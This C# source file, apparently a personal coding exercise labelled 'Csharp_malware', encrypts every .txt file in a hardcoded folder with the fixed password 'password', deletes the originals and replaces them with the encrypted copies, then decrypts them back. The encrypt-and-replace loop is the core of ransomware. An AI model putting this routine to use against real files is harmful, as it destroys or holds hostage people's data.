using System;
using System.IO;
using SharpAESCrypt;


namespace Csharp_malware;

public class Program
{
    public static void Main(string[] args)
    {
       var dir = @"/Users/jerem/Documents/fetch_coding_exersice/Csharp_malware/Files";
       List<string> files = new List<string>();
       DirectoryInfo dirInfo = new DirectoryInfo(dir);
       
       //Build list of files
       foreach(var file in dirInfo.GetFiles("*.txt"))
       {
            files.Add(file.ToString());
       }

       //Encrypt all files
       foreach(var file in files)
       {
            var encryptedFile = dir + @"/encryptedFile.txt";
            SharpAESCrypt.SharpAESCrypt.Encrypt("password", file, encryptedFile);
            File.Delete(file);
            File.Move(encryptedFile, file);

       }

       //Decrypt all files
       foreach(var file in files)
       {
            var decryptedFile = dir + @"/decryptedFile.txt";
            SharpAESCrypt.SharpAESCrypt.Decrypt("password", file, decryptedFile);
            File.Delete(file);
            File.Move(decryptedFile, file);

       }
    }
}
